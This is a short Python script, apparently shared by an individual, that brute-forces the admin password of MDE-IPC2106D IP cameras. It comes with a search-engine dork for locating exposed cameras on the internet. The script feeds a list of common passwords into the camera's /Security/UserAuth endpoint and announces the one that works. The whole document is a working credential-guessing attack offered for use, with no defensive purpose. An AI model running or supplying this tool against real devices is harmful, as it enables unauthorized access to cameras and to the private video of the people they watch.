'''
 this code do brute force attack for camera Model MDE-IPC2106D
 Dork intitle:"ip camera" "user login" "user name" "password" "preview stream"
 BY SaLeH | IG : 8_wvu
'''
import requests
IP = input("[?] Enter Your IP :")
url = f'http://{IP}/Security/UserAuth'

file = open("500-worst-passwords.txt", 'r')
for i in range(583):
	password = file.readline().strip()
	print(f"Password: {password}")

	data = {
		'Username':'admin',
		'Password':password
	}

	r = requests.put(url,data=data)
	print(r.text)
	if ("<message>none</message>") in r.text:
		print(f"I found the password soo ez : {password}\n{url}")
		break
	elif ("auth failed!") in r.text:
		pass
	elif ("<statusCode>-17</statusCode>") in r.text:
		pass
	else:
		print(f"I don't now it's is this : {r.text}\n\n{password}\n{url}")
